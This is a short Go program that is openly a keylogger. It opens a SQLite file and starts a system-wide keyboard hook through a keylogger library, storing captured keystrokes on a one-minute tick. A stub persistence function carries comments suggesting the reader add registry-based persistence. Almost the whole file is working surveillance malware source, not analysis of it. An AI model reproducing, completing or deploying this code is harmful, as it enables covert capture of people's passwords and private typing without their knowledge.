package main

import (
	"database/sql"
	"fmt"
	"os"
	"time"

	kl "github.com/cauefcr/keylogger"
	_ "github.com/mattn/go-sqlite3" // Import go-sqlite3 library
	hook "github.com/robotn/gohook"
)

func persist() {
	// exercise left to the reader
	// put it in a register somewhere idk
}

func main() {
	persist()
	// lifted from https://johnpili.com/golang-sqlite-simple-example/
	if _, err := os.Stat("db.db"); os.IsNotExist(err) {
		fmt.Println("Creating db.db...")
		file, err := os.Create("db.db") // Create SQLite file
		if err != nil {
			panic(err)
		}
		file.Close()
		fmt.Println("db.db created")
	}

	db, _ := sql.Open("sqlite3", "./db.db") // Open the created SQLite File
	defer db.Close()                        // Defer Closing the database
	kl.CreateTable(db)                      // Create Database Tables
	ev := hook.Start()
	tick := time.Tick(1 * time.Minute)
	kl.RunHook(ev, tick)
}
